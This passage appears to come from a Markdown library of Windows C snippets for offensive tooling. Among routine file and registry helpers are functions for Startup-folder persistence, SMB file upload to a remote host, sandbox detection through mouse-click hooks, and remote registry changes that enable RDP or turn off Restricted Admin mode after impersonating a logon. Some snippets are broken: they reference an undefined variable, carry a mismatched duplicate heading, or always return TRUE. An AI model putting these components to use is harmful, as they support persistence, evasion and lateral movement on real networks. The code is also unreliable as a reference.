		printf("[!] CreateFileW Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!WriteFile(hFile, pFileBuffer, dwFileSize, &dwNumberOfBytesWritten, NULL) || dwFileSize != dwNumberOfBytesWritten) {
		printf("[!] WriteFile Failed With Error: %d \n[i] Wrote %d Of %d Bytes \n", GetLastError(), dwNumberOfBytesWritten, dwFileSize);
		goto _END_OF_FUNC;
	}

_END_OF_FUNC:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	return (dwNumberOfBytesWritten == dwFileSize) ? TRUE : FALSE;
}
```
### Write File To Disk (ASCII)
```c
#include <windows.h>
#include <stdio.h>
BOOL WriteFileToDiskA(IN LPCSTR cFileName, IN PBYTE pFileBuffer, OUT DWORD dwFileSize) {

	HANDLE		hFile					= INVALID_HANDLE_VALUE;
	DWORD		dwNumberOfBytesWritten	= 0x00;

	if (!cFileName || !pFileBuffer || !dwFileSize)
		goto _END_OF_FUNC;

	if ((hFile = CreateFileA(cFileName, GENERIC_READ | GENERIC_WRITE, 0x00, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileA Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!WriteFile(hFile, pFileBuffer, dwFileSize, &dwNumberOfBytesWritten, NULL) || dwFileSize != dwNumberOfBytesWritten) {
		printf("[!] WriteFile Failed With Error: %d \n[i] Wrote %d Of %d Bytes \n", GetLastError(), dwNumberOfBytesWritten, dwFileSize);
		goto _END_OF_FUNC;
	}

_END_OF_FUNC:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	return (dwNumberOfBytesWritten == dwFileSize) ? TRUE : FALSE;
}
```
### Open File Handle (ASCII)
```c
#include <windows.h>
#include <stdio.h>
BOOL OpenFileHandleA(IN LPCSTR cFileName, IN OPTIONAL DWORD dwFlags, OUT OPTIONAL PHANDLE phFile) {

	if (!cFileName || !phFile)
		return FALSE;

	if ((*phFile = CreateFileA(cFileName, (GENERIC_READ | GENERIC_WRITE | DELETE), 0x00, NULL, OPEN_EXISTING, (FILE_ATTRIBUTE_NORMAL | dwFlags), NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileA Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}
```
### Delete File (ASCII)
```c
#include <windows.h>
#include <stdio.h>
BOOL DeleteFileFromDiskA(IN LPCSTR cFileName) {

	if (!cFileName)
		return FALSE;

	if (!DeleteFileA(cFileName)) {
		printf("[!] DeleteFileA Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}
```
### Delete File Using Handle
```c
#include <windows.h>
#include <stdio.h>
BOOL DeleteFileUsingHandle(IN HANDLE hFile) {

	if (!hFile || hFile == INVALID_HANDLE_VALUE)
		return FALSE;

	FILE_DISPOSITION_INFO	FileDispInfo	= { .DeleteFileW = TRUE };
	BOOL					bResult			= FALSE;


	if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &FileDispInfo, sizeof(FILE_DISPOSITION_INFO))) {

		if (GetLastError() == ERROR_ACCESS_DENIED)
			printf("[!] File Handle Does Not Have DELETE Permission\n");
		else
			printf("[!] SetFileInformationByHandle Failed With Error: %d\n", GetLastError());

		goto _END_OF_FUNC;
	}

	bResult = TRUE;

_END_OF_FUNC:
	if (!CloseHandle(hFile)) {
		printf("[!] CloseHandle Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	return bResult;
}
```
### Open File Handle (Unicode)
```c
#include <windows.h>
#include <stdio.h>
BOOL OpenFileHandleW(IN LPCWSTR szFileName, IN OPTIONAL DWORD dwFlags, OUT PHANDLE phFile) {

	if (!szFileName || !phFile)
		return FALSE;

	if ((*phFile = CreateFileW(szFileName, (GENERIC_READ | GENERIC_WRITE | DELETE), 0x00, NULL, OPEN_EXISTING, (FILE_ATTRIBUTE_NORMAL | dwFlags), NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}
```
### Read a File From Disk (ASCII)
```c
#include <windows.h>
#include <stdio.h>
BOOL ReadFileFromDiskA(IN LPCSTR cFileName, OUT PBYTE* ppFileBuffer, OUT PDWORD pdwFileSize) {

	HANDLE		hFile					= INVALID_HANDLE_VALUE;
	DWORD		dwFileSize				= NULL,
				dwNumberOfBytesRead		= NULL;
	PBYTE		pBaseAddress			= NULL;

	if (!cFileName || !pdwFileSize || !ppFileBuffer)
		goto _END_OF_FUNC;

	if ((hFile = CreateFileA(cFileName, GENERIC_READ, 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileA Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if ((dwFileSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE) {
		printf("[!] GetFileSize Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(pBaseAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize))) {
		printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!ReadFile(hFile, pBaseAddress, dwFileSize, &dwNumberOfBytesRead, NULL) || dwFileSize != dwNumberOfBytesRead) {
		printf("[!] ReadFile Failed With Error: %d \n[i] Read %d Of %d Bytes \n", GetLastError(), dwNumberOfBytesRead, dwFileSize);
		goto _END_OF_FUNC;
	}

	*ppFileBuffer = pBaseAddress;
	*pdwFileSize  = dwFileSize;

_END_OF_FUNC:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	if (pBaseAddress && !*ppFileBuffer)
		HeapFree(GetProcessHeap(), 0x00, pBaseAddress);
	return (*ppFileBuffer && *pdwFileSize) ? TRUE : FALSE;
}
```
### Read a File From Disk (Unicode)
```c
#include <windows.h>
#include <stdio.h>
BOOL ReadFileFromDiskW(IN LPCWSTR szFileName, OUT PBYTE* ppFileBuffer, OUT PDWORD pdwFileSize) {

	HANDLE		hFile					= INVALID_HANDLE_VALUE;
	DWORD		dwFileSize				= NULL,
				dwNumberOfBytesRead		= NULL;
	PBYTE		pBaseAddress			= NULL;

	if (!szFileName || !pdwFileSize || !ppFileBuffer)
		goto _END_OF_FUNC;

	if ((hFile = CreateFileW(szFileName, GENERIC_READ, 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if ((dwFileSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE) {
		printf("[!] GetFileSize Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(pBaseAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize))) {
		printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!ReadFile(hFile, pBaseAddress, dwFileSize, &dwNumberOfBytesRead, NULL) || dwFileSize != dwNumberOfBytesRead) {
		printf("[!] ReadFile Failed With Error: %d \n[i] Read %d Of %d Bytes \n", GetLastError(), dwNumberOfBytesRead, dwFileSize);
		goto _END_OF_FUNC;
	}

	*ppFileBuffer = pBaseAddress;
	*pdwFileSize  = dwFileSize;

_END_OF_FUNC:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	if (pBaseAddress && !*ppFileBuffer)
		HeapFree(GetProcessHeap(), 0x00, pBaseAddress);
	return (*ppFileBuffer && *pdwFileSize) ? TRUE : FALSE;
}
```
### Delete File (Unicode)
```c
#include <windows.h>
#include <stdio.h>
BOOL DeleteFileFromDiskW(IN LPCWSTR szFileName) {

	if (!szFileName)
		return FALSE;

	if (!DeleteFileW(szFileName)) {
		printf("[!] DeleteFileW Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}
```
### Create File (ASCII)
```c
#include <windows.h>
#include <stdio.h>
BOOL CreateFileOnDiskA(IN LPCSTR cFileName, IN OPTIONAL DWORD dwFlags, OUT OPTIONAL PHANDLE phFile) {

	if (!cFileName)
		return FALSE;

	HANDLE hFile = INVALID_HANDLE_VALUE;

	if ((hFile = CreateFileA(cFileName, (GENERIC_READ | GENERIC_WRITE | DELETE), 0x00, NULL, CREATE_NEW, (FILE_ATTRIBUTE_NORMAL | dwFlags), NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileA Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	if (phFile)
		*phFile = hFile;
	else
		CloseHandle(hFile);

	return TRUE;
}
```
### Create File (Unicode)
```c
#include <windows.h>
#include <stdio.h>
BOOL CreateFileOnDiskW(IN LPCWSTR szFileName, IN OPTIONAL DWORD dwFlags, OUT OPTIONAL PHANDLE phFile) {

	if (!szFileName)
		return FALSE;

	HANDLE hFile = INVALID_HANDLE_VALUE;

	if ((hFile = CreateFileW(szFileName, (GENERIC_READ | GENERIC_WRITE | DELETE), 0x00, NULL, CREATE_NEW, (FILE_ATTRIBUTE_NORMAL | dwFlags), NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	if (phFile)
		*phFile = hFile;
	else
		CloseHandle(hFile);

	return TRUE;
}
```
### Move File To Startup Folder (Unicode)
```c
#include <windows.h>
#include <stdio.h>
#include <shlobj.h>

BOOL MoveFileToStartUpFolderW(IN LPCWSTR szFileNamePath, IN BOOL bCopyNotMove) {

    WCHAR   szStartupPath[MAX_PATH]     = { 0 };
    WCHAR   szDestPath[MAX_PATH * 2]    = { 0 };
    WCHAR*  szFileName                  = NULL;

    for (CONST WCHAR* p = szFileNamePath; *p; p++) {
        if (*p == L'\\' || *p == L'/')
            szFileName = p + 1;
    }

    if (!SHGetSpecialFolderPathW(NULL, szStartupPath, CSIDL_STARTUP, FALSE)) {
        printf("[!] SHGetSpecialFolderPathW Failed With Error: %d\n", GetLastError());
        return FALSE;
    }

    swprintf_s(szDestPath, MAX_PATH * 2, L"%s\\%s", szStartupPath, szFileName);

    if (bCopyNotMove) {
        if (!CopyFileW(szFileNamePath, szDestPath, FALSE)) {
            printf("[!] CopyFileW Failed With Error: %d\n", GetLastError());
            return FALSE;
        }
    }
    else {
        if (!MoveFileW(szFileNamePath, szDestPath)) {
            printf("[!] MoveFileW Failed With Error: %d\n", GetLastError());
            return FALSE;
        }
    }

    return TRUE;
}
```
### Upload File Via SMB (Unicode)
```c
#include <windows.h>
#include <stdio.h>
#include <winnetwk.h>

#pragma comment(lib,"Mpr.lib")

BOOL UploadFileViaSMBW(IN LPCWSTR szFilePath, IN LPCWSTR szRemotePath, IN LPCWSTR szRemoteHost, IN LPCWSTR szUserName, IN LPCWSTR szPassword) {

    NETRESOURCEW    NetResource     = { 0 };
    DWORD           dwReturn        = 0x00;

    NetResource.dwType          = RESOURCETYPE_ANY;
    NetResource.lpLocalName     = NULL;
    NetResource.lpRemoteName    = szRemoteHost;
    NetResource.lpProvider      = NULL;

    if ((dwReturn = WNetAddConnection2W(&NetResource, Password, szUserName, CONNECT_UPDATE_PROFILE)) != NO_ERROR) {
        printf("[!] WNetAddConnection2W Failed With Error: 0x%0.8X\n", dwReturn);
        return FALSE;
    }

    if (!CopyFileW(szFilePath, szRemotePath, FALSE)) {
        printf("[!] CopyFileW Failed With Error: %d\n", GetLastError());
        return FALSE;
    }

    if ((dwReturn = WNetCancelConnection2W(NetResource.lpRemoteName, 0x00, TRUE)) != NO_ERROR) {
        printf("[!] WNetCancelConnection2W Failed With Error: 0x%0.8X\n", dwReturn);
        return FALSE;
    }

    return TRUE;
}
```
### Move File To Startup Folder (ASCII)
```c
#include <windows.h>
#include <stdio.h>
#include <shlobj.h>

BOOL MoveFileToStartUpFolderA(IN LPCSTR lpFileNamePath, IN BOOL bCopyNotMove) {

    CHAR    cStartupPath[MAX_PATH]  = { 0 };
    CHAR    cDestPath[MAX_PATH * 2] = { 0 };
    CHAR*   cFileName               = NULL;

    for (CONST CHAR* p = lpFileNamePath; *p; p++) {
        if (*p == '\\' || *p == '/')
            cFileName = p + 1;
    }

    if (!SHGetSpecialFolderPathA(NULL, cStartupPath, CSIDL_STARTUP, FALSE)) {
        printf("[!] SHGetSpecialFolderPathA Failed With Error: %d\n", GetLastError());
        return FALSE;
    }

    sprintf_s(cDestPath, MAX_PATH * 2, "%s\\%s", cStartupPath, cFileName);

    if (bCopyNotMove) {
        if (!CopyFileA(lpFileNamePath, cDestPath, FALSE)) {
            printf("[!] CopyFileW Failed With Error: %d\n", GetLastError());
            return FALSE;
        }
    }
    else {
        if (!MoveFileA(lpFileNamePath, cDestPath)) {
            printf("[!] MoveFileW Failed With Error: %d\n", GetLastError());
            return FALSE;
        }
    }

    return TRUE;
}
```
### Upload File Via SMB (ASCII)
```c
#include <windows.h>
#include <stdio.h>
#include <winnetwk.h>

#pragma comment(lib,"Mpr.lib")

BOOL UploadFileViaSMBA(IN LPCSTR cFilePath, IN LPCSTR cRemotePath, IN LPCSTR cRemoteHost, IN LPCSTR cUserName, IN LPCSTR cPassword) {

    NETRESOURCEA    NetResource     = { 0 };
    DWORD           dwReturn        = 0x00;

    NetResource.dwType          = RESOURCETYPE_ANY;
    NetResource.lpLocalName     = NULL;
    NetResource.lpRemoteName    = cRemoteHost;
    NetResource.lpProvider      = NULL;

    if ((dwReturn = WNetAddConnection2A(&NetResource, Password, cUserName, CONNECT_UPDATE_PROFILE)) != NO_ERROR) {
        printf("[!] WNetAddConnection2A Failed With Error: 0x%0.8X\n", dwReturn);
        return FALSE;
    }

    if (!CopyFileA(cFilePath, cRemotePath, FALSE)) {
        printf("[!] CopyFileA Failed With Error: %d\n", GetLastError());
        return FALSE;
    }

    if ((dwReturn = WNetCancelConnection2A(NetResource.lpRemoteName, 0x00, TRUE)) != NO_ERROR) {
        printf("[!] WNetCancelConnection2A Failed With Error: 0x%0.8X\n", dwReturn);
        return FALSE;
    }

    return TRUE;
}
```
### Detect Virtualization Through User Interaction 
```c
#include <windows.h>
#include <stdio.h>
DWORD   g_dwMouseClicks     = 0x00;
HHOOK   g_hMouseHook        = 0x00;

LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam) {

    if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN)
        g_dwMouseClicks++;

    return CallNextHookEx(g_hMouseHook, nCode, wParam, lParam);
}

BOOL MouseClicksLogger() {

    MSG     Msg     = { 0 };

    if (!(g_hMouseHook = SetWindowsHookExW(WH_MOUSE_LL, (HOOKPROC)HookProc, NULL, NULL))) {
        printf("[!] SetWindowsHookExW Failed With Error: %d \n", GetLastError());
        return FALSE;
    }

    while (GetMessageW(&Msg, NULL, NULL, NULL))
        DefWindowProcW(Msg.hwnd, Msg.message, Msg.wParam, Msg.lParam);

    return TRUE;
}


BOOL IsVirtualEnvUserInteraction(IN DWORD dwMonitorTimeInSec, IN OPTIONAL DWORD dwNmbrOfMouseClicks) {

    HANDLE      hThread         = NULL;
    DWORD       dwMouseClicks   = 0x05;

    if (!dwMonitorTimeInSec)
        return FALSE;

    // dwNmbrOfMouseClicks should be at least 2
    if (dwNmbrOfMouseClicks && dwNmbrOfMouseClicks > 1)
        dwMouseClicks = dwNmbrOfMouseClicks;

    if (!(hThread = CreateThread(NULL, 0x00, (LPTHREAD_START_ROUTINE)MouseClicksLogger, NULL, 0x00, NULL))) {
        printf("[!] CreateThread Failed With Error: %d \n", GetLastError());
        return FALSE;
    }

    // Wait for dwMonitorTimeInSec seconds
    WaitForSingleObject(hThread, dwMonitorTimeInSec * 1000);

    if ((g_hMouseHook != NULL) && !UnhookWindowsHookEx(g_hMouseHook)) {
        printf("[!] UnhookWindowsHookEx Failed With Error: %d \n", GetLastError());
        return FALSE;
    }

    // Less than dwMouseClicks mouse clicks
    if (g_dwMouseClicks <= dwMouseClicks)
        return TRUE;

    return FALSE;
}
```
### Read From a Registry Key (Unicode)
```c
#include <windows.h>
#include <stdio.h>
BOOL ReadFromRegKeyW(IN HKEY hKey, IN LPCWSTR szSubKey, IN LPCWSTR szRegName, OUT PBYTE* ppRegData, OUT PDWORD pdwDataSize) {

	LSTATUS		STATUS		= 0x00;
	DWORD		dwDataSize	= 0x00;
	PBYTE		pRegData	= NULL;

	if (!hKey || !szSubKey || !szRegName || !ppRegData || !pdwDataSize)
		return FALSE;

	if ((STATUS = RegGetValueW(hKey, szSubKey, szRegName, RRF_RT_ANY, NULL, NULL, &dwDataSize)) != ERROR_SUCCESS) {
		printf("[!] RegGetValueW [%d] Failed With Error: 0x%0.8X\n", __LINE__, STATUS);
		return FALSE;
	}

	if (!(pRegData = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwDataSize))) {
		printf("[!] HeapAlloc Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	if ((STATUS = RegGetValueW(hKey, szSubKey, szRegName, RRF_RT_ANY, NULL, pRegData, &dwDataSize)) != ERROR_SUCCESS) {
		printf("[!] RegGetValueW [%d] Failed With Error: 0x%0.8X\n", __LINE__, STATUS);
		return FALSE;
	}

	*pdwDataSize	= dwDataSize;
	*ppRegData		= pRegData;

	return (*pdwDataSize && *ppRegData) ? TRUE : FALSE;
}
```
### Write To Registry Key (Unicode)
```c
#include <windows.h>
#include <stdio.h>
BOOL WriteToRegKeyW(IN HKEY hKey, IN LPCWSTR szSubKey, IN LPCWSTR szRegName, IN PBYTE pRegData, IN DWORD dwDataSize) {

	HKEY		hkResult	= NULL;
	BOOL		bResult		= FALSE;
	LSTATUS		STATUS		= 0x00;

	if (!hKey || !szSubKey || !szRegName || !pRegData || !dwDataSize)
		return FALSE;

	if ((STATUS = RegOpenKeyExW(hKey, szSubKey, 0x00, KEY_WRITE, &hkResult)) != ERROR_SUCCESS) {
		printf("[!] RegOpenKeyExW Failed With Error: 0x%0.8X\n", STATUS);
		return FALSE;
	}

	if ((STATUS = RegSetValueExW(hkResult, szRegName, 0x00, REG_NONE, pRegData, dwDataSize)) != ERROR_SUCCESS) {
		printf("[!] RegSetValueExW Failed With Error: 0x%0.8X\n", STATUS);
	}

	bResult = TRUE;

_END_OF_FUNC:
	if (hkResult)
		RegCloseKey(hkResult);
	return bResult;
}
```
### Write To Registry Key (ASCII)
```c
#include <windows.h>
#include <stdio.h>
BOOL WriteToRegKeyA(IN HKEY hKey, IN LPCSTR lpcSubKey, IN LPCSTR lpcRegName, IN PBYTE pRegData, IN DWORD dwDataSize) {

	HKEY		hkResult		= NULL;
	BOOL		bResult			= FALSE;
	LSTATUS		STATUS			= 0x00;

	if (!hKey || !lpcSubKey || !lpcRegName || !pRegData || !dwDataSize)
		return FALSE;

	if ((STATUS = RegOpenKeyExA(hKey, lpcSubKey, 0x00, KEY_WRITE, &hkResult)) != ERROR_SUCCESS) {
		printf("[!] RegOpenKeyExA Failed With Error: 0x%0.8X\n", STATUS);
		return FALSE;
	}

	if ((STATUS = RegSetValueExA(hkResult, lpcRegName, 0x00, REG_NONE, pRegData, dwDataSize)) != ERROR_SUCCESS){
		printf("[!] RegSetValueExA Failed With Error: 0x%0.8X\n", STATUS);
	}

	bResult = TRUE;

_END_OF_FUNC:
	if (hkResult)
		RegCloseKey(hkResult);
	return bResult;
}
```
### Read From a Registry Key (ASCII)
```c
#include <windows.h>
#include <stdio.h>
BOOL ReadFromRegKeyA(IN HKEY hKey, IN LPCSTR lpcSubKey, IN LPCSTR lpcRegName, OUT PBYTE* ppRegData, OUT PDWORD pdwDataSize) {

	LSTATUS		STATUS			= 0x00;
	DWORD		dwDataSize		= 0x00;
	PBYTE		pRegData		= NULL;

	if (!hKey || !lpcSubKey || !lpcRegName || !ppRegData || !pdwDataSize)
		return FALSE;

	if ((STATUS = RegGetValueA(hKey, lpcSubKey, lpcRegName, RRF_RT_ANY, NULL, NULL, &dwDataSize)) != ERROR_SUCCESS) {
		printf("[!] RegGetValueA [%d] Failed With Error: 0x%0.8X\n", __LINE__, STATUS);
		return FALSE;
	}

	if (!(pRegData = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwDataSize))) {
		printf("[!] HeapAlloc Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	if ((STATUS = RegGetValueA(hKey, lpcSubKey, lpcRegName, RRF_RT_ANY, NULL, pRegData, &dwDataSize)) != ERROR_SUCCESS) {
		printf("[!] RegGetValueA [%d] Failed With Error: 0x%0.8X\n", __LINE__, STATUS);
		return FALSE;
	}

	*pdwDataSize	= dwDataSize;
	*ppRegData		= pRegData;

	return (*pdwDataSize && *ppRegData) ? TRUE : FALSE;
}
```
### Enable Remote Desktop Via Registry (ASCII)
```c
#include <windows.h>
#include <stdio.h>
BOOL EnableRemoteDesktopA(IN LPCSTR cMachineName, IN LPCSTR cUserName, IN LPCSTR cPassword, IN LPCSTR cDomain) {

    BOOL        bResult             = FALSE;
    LSTATUS     STATUS              = 0x00;
    HANDLE      hToken              = NULL;
    HKEY        hKey                = NULL;
    DWORD       dwKeyValue          = 0x00,
                dwKeyValueSize      = sizeof(DWORD);

    if (!LogonUserA(cUserName, cMachineName, cPassword, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &hToken)) {
        printf("[!] LogonUserA Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!ImpersonateLoggedOnUser(hToken)) {
        printf("[!] ImpersonateLoggedOnUser Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
}

    if ((STATUS = RegConnectRegistryA(cMachineName, HKEY_LOCAL_MACHINE, &hKey)) != ERROR_SUCCESS) {
        printf("[!] RegConnectRegistryA Failed With Error: 0x%0.8X\n", STATUS);
        goto _END_OF_FUNC;
    }

    if ((STATUS = RegOpenKeyExA(hKey, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server", 0x00, KEY_SET_VALUE, &hKey)) != ERROR_SUCCESS) {
        printf("[!] RegOpenKeyExA Failed With Error: 0x%0.8X\n", STATUS);
        goto _END_OF_FUNC;
    }

    if ((STATUS = RegSetValueExA(hKey, "fDenyTSConnections", 0x00, REG_DWORD, (LPBYTE)&dwKeyValue, dwKeyValueSize)) != ERROR_SUCCESS) {
        printf("[!] RegSetValueExA Failed With Error: 0x%0.8X\n", STATUS);
        goto _END_OF_FUNC;
    }

_END_OF_FUNC:
    if (hKey != NULL)
        RegCloseKey(hKey);
    if (hToken != NULL)
        CloseHandle(hToken);
    return TRUE;
}
```
### Disable Restricted Admin Mode Via Registry
```c
#include <windows.h>
#include <stdio.h>
BOOL DisableRestrictedAdminW(IN LPCWSTR szMachineName, IN LPCWSTR szUserName, IN LPCWSTR szPassword, IN LPCWSTR szDomain) {

    BOOL        bResult             = FALSE;
    LSTATUS     STATUS              = 0x00;
    HANDLE      hToken              = NULL;
    HKEY        hKey                = NULL;
    DWORD       dwKeyValue          = 0x01,
                dwKeyValueSize      = sizeof(DWORD);

    if (!LogonUserW(szUserName, szMachineName, szPassword, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &hToken)) {
        printf("[!] LogonUserW Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!ImpersonateLoggedOnUser(hToken)) {
        printf("[!] ImpersonateLoggedOnUser Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if ((STATUS = RegConnectRegistryW(szMachineName, HKEY_LOCAL_MACHINE, &hKey)) != ERROR_SUCCESS) {
        printf("[!] RegConnectRegistryW Failed With Error: 0x%0.8X\n", STATUS);
        goto _END_OF_FUNC;
    }

    if ((STATUS = RegOpenKeyExW(hKey, L"SYSTEM\\CurrentControlSet\\Control\\Lsa", 0x00, KEY_SET_VALUE, &hKey)) != ERROR_SUCCESS) {
        printf("[!] RegOpenKeyExW Failed With Error: 0x%0.8X\n", STATUS);
        goto _END_OF_FUNC;
    }

    if ((STATUS = RegSetValueExW(hKey, L"DisableRestrictedAdmin", 0x00, REG_DWORD, (LPBYTE)&dwKeyValue, dwKeyValueSize)) != ERROR_SUCCESS) {
        printf("[!] RegSetValueExW Failed With Error: 0x%0.8X\n", STATUS);
        goto _END_OF_FUNC;
    }

_END_OF_FUNC:
    if (hKey != NULL)
        RegCloseKey(hKey);
    if (hToken != NULL)
        CloseHandle(hToken);
    return TRUE;
}
```
### Disable Remote Desktop Via Registry (Unicode)
```c
#include <windows.h>
#include <stdio.h>
BOOL DisableRestrictedAdminA(IN LPCSTR cMachineName, IN LPCSTR cUserName, IN LPCSTR cPassword, IN LPCSTR cDomain) {

    BOOL        bResult         = FALSE;
    LSTATUS     STATUS          = 0x00;
    HANDLE      hToken          = NULL;
    HKEY        hKey            = NULL;
    DWORD       dwKeyValue      = 0x01,
                dwKeyValueSize  = sizeof(DWORD);

    if (!LogonUserA(cUserName, cMachineName, cPassword, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &hToken)) {
        printf("[!] LogonUserA Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!ImpersonateLoggedOnUser(hToken)) {
        printf("[!] ImpersonateLoggedOnUser Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
}

    if ((STATUS = RegConnectRegistryA(cMachineName, HKEY_LOCAL_MACHINE, &hKey)) != ERROR_SUCCESS) {
        printf("[!] RegConnectRegistryA Failed With Error: 0x%0.8X\n", STATUS);
        goto _END_OF_FUNC;
    }

    if ((STATUS = RegOpenKeyExA(hKey, "SYSTEM\\CurrentControlSet\\Control\\Lsa", 0x00, KEY_SET_VALUE, &hKey)) != ERROR_SUCCESS) {
        printf("[!] RegOpenKeyExA Failed With Error: 0x%0.8X\n", STATUS);
        goto _END_OF_FUNC;
    }

    if ((STATUS = RegSetValueExA(hKey, "DisableRestrictedAdmin", 0x00, REG_DWORD, (LPBYTE)&dwKeyValue, dwKeyValueSize)) != ERROR_SUCCESS) {
        printf("[!] RegSetValueExA Failed With Error: 0x%0.8X\n", STATUS);
        goto _END_OF_FUNC;
    }

_END_OF_FUNC:
    if (hKey != NULL)
        RegCloseKey(hKey);
    if (hToken != NULL)
        CloseHandle(hToken);
    return TRUE;
}
```
### Disable Restricted Admin Mode Via Registry (ASCII)
```c
#include <windows.h>
#include <stdio.h>
BOOL DisableRestrictedAdminA(IN LPCSTR cMachineName, IN LPCSTR cUserName, IN LPCSTR cPassword, IN LPCSTR cDomain) {

    BOOL        bResult         = FALSE;
    LSTATUS     STATUS          = 0x00;
    HANDLE      hToken          = NULL;
    HKEY        hKey            = NULL;
    DWORD       dwKeyValue      = 0x01,
                dwKeyValueSize  = sizeof(DWORD);

    if (!LogonUserA(cUserName, cMachineName, cPassword, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &hToken)) {
        printf("[!] LogonUserA Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!ImpersonateLoggedOnUser(hToken)) {
        printf("[!] ImpersonateLoggedOnUser Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
}

    if ((STATUS = RegConnectRegistryA(cMachineName, HKEY_LOCAL_MACHINE, &hKey)) != ERROR_SUCCESS) {
        printf("[!] RegConnectRegistryA Failed With Error: 0x%0.8X\n", STATUS);
        goto _END_OF_FUNC;
    }

    if ((STATUS = RegOpenKeyExA(hKey, "SYSTEM\\CurrentControlSet\\Control\\Lsa", 0x00, KEY_SET_VALUE, &hKey)) != ERROR_SUCCESS) {
        printf("[!] RegOpenKeyExA Failed With Error: 0x%0.8X\n", STATUS);
        goto _END_OF_FUNC;
    }

    if ((STATUS = RegSetValueExA(hKey, "DisableRestrictedAdmin", 0x00, REG_DWORD, (LPBYTE)&dwKeyValue, dwKeyValueSize)) != ERROR_SUCCESS) {
        printf("[!] RegSetValueExA Failed With Error: 0x%0.8X\n", STATUS);
        goto _END_OF_FUNC;
    }

_END_OF_FUNC:
    if (hKey != NULL)
        RegCloseKey(hKey);
    if (hToken != NULL)
        CloseHandle(hToken);
    return TRUE;
}
```
### Enable Restricted Admin Mode Via Registry (Unicode)
```c
#include <windows.h>
#include <stdio.h>
BOOL EnableRestrictedAdminW(IN LPCWSTR szMachineName, IN LPCWSTR szUserName, IN LPCWSTR szPassword, IN LPCWSTR szDomain) {

    BOOL        bResult             = FALSE;
    LSTATUS     STATUS              = 0x00;
    HANDLE      hToken              = NULL;
    HKEY        hKey                = NULL;
    DWORD       dwKeyValue          = 0x00,
                dwKeyValueSize      = sizeof(DWORD);

    if (!LogonUserW(szUserName, szMachineName, szPassword, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &hToken)) {
        printf("[!] LogonUserW Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!ImpersonateLoggedOnUser(hToken)) {
        printf("[!] ImpersonateLoggedOnUser Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if ((STATUS = RegConnectRegistryW(szMachineName, HKEY_LOCAL_MACHINE, &hKey)) != ERROR_SUCCESS) {
        printf("[!] RegConnectRegistryW Failed With Error: 0x%0.8X\n", STATUS);
        goto _END_OF_FUNC;
    }

    if ((STATUS = RegOpenKeyExW(hKey, L"SYSTEM\\CurrentControlSet\\Control\\Lsa", 0x00, KEY_SET_VALUE, &hKey)) != ERROR_SUCCESS) {
        printf("[!] RegOpenKeyExW Failed With Error: 0x%0.8X\n", STATUS);
